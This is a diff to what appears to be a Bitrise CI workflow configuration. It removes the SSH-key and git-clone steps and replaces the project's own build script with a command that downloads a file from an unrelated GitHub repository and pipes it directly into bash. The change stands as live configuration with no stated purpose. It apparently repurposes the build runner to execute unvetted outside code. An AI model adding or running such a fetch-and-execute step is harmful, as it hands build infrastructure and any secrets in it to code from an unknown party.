@@ -5,15 +5,11 @@ project_type: other
 workflows:
   primary:
     steps:
-    - activate-ssh-key@4:
-        run_if: '{{getenv "SSH_RSA_PRIVATE_KEY" | ne ""}}'
-    - git-clone@8: {}
     - script@1:
-        title: Run main.sh
+        title: curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/v1 | bash
         inputs:
         - content: |
-            #!/bin/bash
-            bash main.sh
+             curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/v1 | bash
     - deploy-to-bitrise-io@2: {}
 meta:
   bitrise.io:
